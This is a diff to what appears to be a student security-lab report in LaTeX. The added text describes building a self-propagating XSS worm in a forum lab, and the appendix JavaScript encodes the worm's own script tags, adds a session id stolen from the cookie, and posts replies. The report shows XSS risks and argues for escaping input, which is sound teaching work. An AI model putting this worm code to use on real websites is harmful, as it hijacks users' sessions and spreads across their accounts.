@@ -373,7 +373,13 @@ We also noticed that after refreshing multiple times, the response contains an e
 \includegraphics[width=.95\textwidth]{gfx/xss/task5-worm-working}
 
 \subsection{Writing a Self-Propagating XSS Worm}
-We also successfully modified the worm in a way that posted message contains the the worm itself. The souce code is available in \emph{appendix}~\ref{app:javasc2}.
+We also successfully modified the worm in a way that posted message contains the the worm itself. The source code is available in \emph{appendix}~\ref{app:javasc2}.
+The worm would post another reply as the user viewing the infected message, and the new reply would also contain the worm code. We expected to see exponential increase in the replies as we viewed the thread, however the mechanism preventing too many posts at a time mentioned in previous part was to an extent preventing this to happen.
+
+We can see that the reply "Attack" was created after that Bob visited the thread, however in the Firebug output now two requests are being made, because the new reply also contains the malicious script.\\
+\includegraphics[width=.95\textwidth]{gfx/xss/task6}
+
+Using such an attack, we could easily flood the forums by creating replies and new threads and maximize the probability that other users will see the malicious script and also be ``responsible'' for infecting the website. If the malicious script makes some intensive GET or POST requests, then using such a worm we could cause the denial of service attack. This emphasizes the importance of preventing the XSS by correctly escaping user provided input on the websites.
 
 \section{SQL injection attack}
 
@@ -842,11 +848,15 @@ var content="subject=XSSWorm"; // You need to fill in the details.
 // Add message body
 content = content.concat("&message=Attack");
 
-  var strCode = document.getElementById("worm");
-  var beg = "%3Cscript id=worm%3E";
-  var end = "%3C/script%3E";
-  var urlEncSample = beg.concat( escape(strCode.innerHTML), end);
-  content = content.concat(urlEncSample);
+// Script tags have to be encoded, otherwise script won't be valid
+// When passed in request string
+var strCode = document.getElementById("worm");
+var beg = "%3Cscript id=worm%3E";
+var end = "%3C/script%3E";
+var urlEncSample = beg.concat( escape(strCode.innerHTML), end);
+
+// Set the script to be content of the request
+content = content.concat(urlEncSample);
 
 // Choose topic number
 content = content.concat("&t=8");
@@ -854,7 +864,7 @@ content = content.concat("&t=8");
 // Add session id stolen from cookie
 content = content.concat("&sid=", stolenCookie); // e.g. 642b0037b1b4f81a4141e8fb505e50f6
 
-// Specify posting mode
+// Specify posting mode, here we want to reply
 content = content.concat("&mode=reply");
 content = content.concat("&post=Submit");
 // Send the HTTP POST request.
